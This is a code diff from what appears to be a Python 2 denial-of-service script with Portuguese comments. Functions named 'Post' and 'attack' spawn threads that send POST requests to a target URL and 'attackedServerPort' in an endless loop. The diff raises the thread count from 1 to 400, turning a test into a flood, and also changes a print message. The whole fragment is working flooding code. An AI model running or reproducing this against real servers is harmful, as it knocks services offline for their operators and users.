@@ -18,7 +18,7 @@ def Post(url,attackedServerPort):
     while not Kill:
         r = requests.post(url, data=parameters, headers=headers)
         print r.text
-    print 'parou'
+    print 'Thread morrendo!'
 
     
 
@@ -26,10 +26,10 @@ def Post(url,attackedServerPort):
 def attack(IP, attackedServerPort):
     channel = []
     #Definicao das n threads
-    for i in range(0, 1):
+    for i in range(0, 400):
         channel.append(Thread(target=Post, args=[IP, attackedServerPort]))
 
-    for i in range(0, 1):
+    for i in range(0, 400):
         #seta as threads como daemon = true para que elas possam ser destruidas
         channel[i].setDaemon(True)
         #Inicia as threads
